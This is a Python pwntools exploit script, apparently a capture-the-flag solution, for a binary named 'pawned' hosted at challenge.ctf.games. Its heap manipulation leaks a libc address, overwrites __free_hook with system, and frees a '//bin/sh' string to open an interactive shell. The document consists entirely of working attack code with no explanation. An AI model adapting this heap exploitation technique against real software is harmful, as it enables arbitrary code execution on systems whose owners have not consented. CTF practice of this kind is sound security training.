#!/usr/bin/python

from pwn import *
from struct import unpack

PATH = './pawned'

GDBSCRIPT = '''
    source ~/debug/loadsym.py
    set debug-file-directory ~/debug/ubuntu-20.04/dbg64
    loadsym ~/debug/ubuntu-20.04/dbg64/libc-2.31.so
'''

HOST = 'challenge.ctf.games'
PORT = 30276

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])


def sell(price, length, name):
    r.sendlineafter('> ', 'S')
    r.sendlineafter(': ', f'{price}')
    r.sendlineafter(': ', f'{length}')
    r.sendlineafter(': ', name)

def buy(index):
    r.sendlineafter('> ', 'B')
    r.sendlineafter(': ', f'{index}')
    
def print_item():
    r.sendlineafter('> ', 'P')
    arr = []
    out = r.recvline(0).split()
    while b'Price' in out:
        arr.append(out[2])
        arr.append(out[4])
        out = r.recvline(0).split()
    return arr

def realloc(index, price, length, name):
    r.sendlineafter('> ', 'M')
    r.sendlineafter(': ', f'{index}')
    r.sendlineafter(': ', f'{price}')
    r.sendlineafter(': ', f'{length}')
    r.sendlineafter(': ', name)
    

def f(v):
    return unpack('<d', p64(v))[0]

def exploit(r):
    sell(f(0xdeadbeef), 0x420, 'A' * 8)
    sell(f(0xdeadbeef),  0x20, 'A' * 8)
    sell(f(0xdeadbeef),  0x20, 'A' * 8)

    buy(1)

    leak = u64(print_item()[1].ljust(8, b'\0'))
    libc.address = leak - 0x1ebbe0

    info(hex(leak))
    info(hex(libc.address))

    buy(3)

    realloc(3, f(libc.sym['__free_hook']), 0x20, 'D' * 8)
    sell(f(u64('//bin/sh')),  0x20, p64(libc.sym['system']))
    
    buy(4)

    # debug(GDBSCRIPT)

    r.interactive()

if __name__ == '__main__':
    path = '/home/abdullahnz/debug/ubuntu-20.04/libc64/libc.so.6'

    elf  = ELF(PATH, checksec = False)
    libc = ELF(path, checksec = False)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        env = {'LD_PRELOAD' : path}
        r = process(PATH, aslr=0, env=env)
    exploit(r)